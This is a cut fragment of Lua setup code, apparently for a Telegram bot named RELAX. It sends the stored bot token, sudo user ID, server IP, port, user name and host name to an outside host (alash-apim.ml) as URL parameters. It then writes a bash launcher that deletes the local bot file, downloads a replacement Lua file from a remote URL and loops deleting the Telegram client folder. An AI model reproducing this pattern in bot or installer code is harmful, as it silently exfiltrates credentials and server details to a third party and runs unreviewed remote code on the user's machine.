...
data,res = https.request("https://black-source.tk/BlackTeAM/index.php?bn=info&id=?bn=info&id="..Id)
if res == 200 then
...
local t = json:decode(https.request('http://alash-apim.ml/api/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("RELAX", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/RELAX
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr RELAX.lua
wget "https://raw.githubusercontent.com/Relaxtele/Relax/main/Relax.lua"
while(true) do
rm -fr ../.telegram-cli
